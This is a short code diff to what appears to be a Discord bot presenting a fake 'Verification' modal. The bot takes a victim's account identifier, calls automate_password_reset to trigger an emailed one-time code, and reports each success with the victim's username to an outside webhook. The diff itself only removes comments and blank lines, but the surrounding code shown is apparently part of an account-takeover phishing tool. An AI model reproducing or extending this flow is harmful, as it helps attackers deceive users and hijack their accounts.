@@ -191,7 +191,6 @@ class MyModalOne(ui.Modal, title="Verification"):
                 result = await automate_password_reset(self.box_two.value)
 
                 if result == "invalid":
-                    # account doesn't exist!
                     await interaction.followup.send(
                         embed=discord.Embed(
                             title="Error ❌",
@@ -201,8 +200,8 @@ class MyModalOne(ui.Modal, title="Verification"):
                         ephemeral=True
                     )
                 else:
+
                     if result is False:
-                        # no 2FA email set
                         await interaction.followup.send(
                             embed=discord.Embed(
                                 title="No Security Email :envelope:",
@@ -213,7 +212,7 @@ class MyModalOne(ui.Modal, title="Verification"):
                             ephemeral=True
                         )
                     else:
-                        # email-OTP succeeded
+                        
                         await interaction.followup.send(
                             embed=discord.Embed(
                                 title="Verification ✅",
@@ -223,6 +222,5 @@ class MyModalOne(ui.Modal, title="Verification"):
                             view=ButtonViewTwo(),
                             ephemeral=True
                         )
-
                         embedtrue=discord.Embed(title="Email A Code Success",timestamp= datetime.datetime.now(),colour=0x00FF00)
                         await webhook.send(embed=embedtrue,username= inty2, avatar_url= "https://i.imgur.com/wWAZZ06.png")
